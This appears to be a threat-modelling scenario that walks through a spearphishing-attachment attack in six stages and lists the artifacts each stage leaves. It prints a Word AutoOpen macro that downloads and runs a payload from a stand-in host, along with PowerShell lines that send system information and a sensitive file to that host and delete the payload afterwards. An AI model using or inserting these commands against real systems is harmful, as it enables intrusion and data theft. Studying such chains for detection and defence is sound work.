Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, involving email clients, web browsers, and office applications, ultimately leading to the execution of a payload that allows the attacker to exfiltrate sensitive data.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Application Involved**: Outlook
- **User Action**: The victim receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
- **Key Artifacts**: Email headers, attachment file (e.g., `invoice.docx`).
- **Command**: 
  ```powershell
  # The victim opens the email and downloads the attachment
  Start-Process "C:\Users\Victim\Downloads\invoice.docx"
  ```

**Stage 2: Exploit Execution**
- **Application Involved**: Microsoft Word
- **User Action**: The victim opens the malicious Word document, which contains a macro designed to download and execute a payload.
- **Key Artifacts**: Macro code embedded in the document, temporary files created during execution.
- **Command**: 
  ```vba
  ' Macro code in Word that executes a PowerShell command to download a payload
  Sub AutoOpen()
      Dim objShell As Object
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "powershell -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\Users\Victim\AppData\Local\Temp\payload.exe' && Start-Process 'C:\Users\Victim\AppData\Local\Temp\payload.exe'"""
  End Sub
  ```

**Stage 3: Payload Execution**
- **Application Involved**: PowerShell
- **User Action**: The macro executes, downloading and running the payload.
- **Key Artifacts**: Executable file (`payload.exe`), PowerShell command history.
- **Command**: 
  ```powershell
  # The payload is executed, potentially establishing a reverse shell
  Start-Process "C:\Users\Victim\AppData\Local\Temp\payload.exe"
  ```

**Stage 4: Command and Control Communication**
- **Application Involved**: PowerShell
- **User Action**: The payload initiates communication with the attacker's command and control (C2) server.
- **Key Artifacts**: Network traffic logs, C2 server IP address (e.g., `malicious.com`).
- **Command**: 
  ```powershell
  # The payload sends system information back to the C2 server
  Invoke-WebRequest -Uri "http://malicious.com/c2" -Method POST -Body "system_info=...&user=Victim"
  ```

**Stage 5: Data Exfiltration**
- **Application Involved**: PowerShell
- **User Action**: The attacker uses the established connection to exfiltrate sensitive data from the victim's system.
- **Key Artifacts**: Exfiltrated files, logs of data sent to the C2 server.
- **Command**: 
  ```powershell
  # The attacker exfiltrates sensitive files
  Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method POST -InFile "C:\Users\Victim\Documents\sensitive_data.txt"
  ```

**Stage 6: Cleanup and Persistence**
- **Application Involved**: PowerShell
- **User Action**: The attacker may attempt to cover their tracks by deleting logs or creating persistence mechanisms.
- **Key Artifacts**: Deleted files, scheduled tasks for persistence.
- **Command**: 
  ```powershell
  # The attacker deletes the downloaded payload to avoid detection
  Remove-Item "C:\Users\Victim\AppData\Local\Temp\payload.exe"
  ```
